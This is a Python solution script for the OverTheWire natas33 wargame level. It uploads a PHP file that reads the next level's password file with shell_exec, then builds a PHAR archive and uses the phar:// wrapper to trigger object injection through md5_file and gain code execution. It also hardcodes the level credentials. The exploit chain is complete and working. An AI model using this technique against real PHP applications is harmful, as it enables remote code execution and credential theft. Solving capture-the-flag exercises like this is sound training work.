"""
Help script to resolve natas challenge #33
"""
import requests
import hashlib
import subprocess
from bs4 import BeautifulSoup

username = "natas33"
password = "shoogeiGa2yee3de6Aex8uaXeech5eey"
auth = (username, password)

url = f"http://{username}.natas.labs.overthewire.org"

"""
From the source code we know that if the uploaded file's digest matches a certain signature, the file will be executed with php.

    if(md5_file($this->filename) == $this->signature){
        echo "Congratulations! Running firmware update: $this->filename <br>";
        passthru("php " . $this->filename);
    }

The md5_file() function is vulnerable to Object injection if a PHAR file is used.
https://blog.ripstech.com/2018/new-php-exploitation-technique/

"""

content = b"<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>"
content_hash = hashlib.md5(content).hexdigest()
filename = "rce.php"


# Nothing does object injection in PHP better than PHP.
# The templating is to avoid fiddling with the private attributes.
with open("natas34.php.template", "r") as template:
    with open("natas34.php", "w") as o:
        o.write(template.read().format(filename, content_hash))

# phar.readonly attribute is usually activated, to avoid exactly what we are trying to do ;)
output = subprocess.check_output(["php", "-d", "phar.readonly=false", "natas34.php"])

# Upload your rce script and overwrite the filename field to have the file accesible for the next step.
requests.post(
    url + "/index.php",
    auth=auth,
    data={"filename": filename, "submit": "Upload File"},
    files={"uploadedfile": content},
)
# Now the tricky part: upload the generated phar file but instead of giving a file name, use the protocol handler.
response = requests.post(
    url + "/index.php",
    auth=auth,
    data={"filename": "test.phar", "submit": "Upload File"},
    files={"uploadedfile": open("test.phar", "rb")},
)

response = requests.post(
    url + "/index.php",
    auth=auth,
    data={"filename": "phar://test.phar/test.txt", "submit": "Upload File"},
    files={"uploadedfile": open("test.phar", "rb")},
)
content = response.content

soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)


# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas34
# Password: shu5ouSu6eicielahhae0mohd4ui5uig
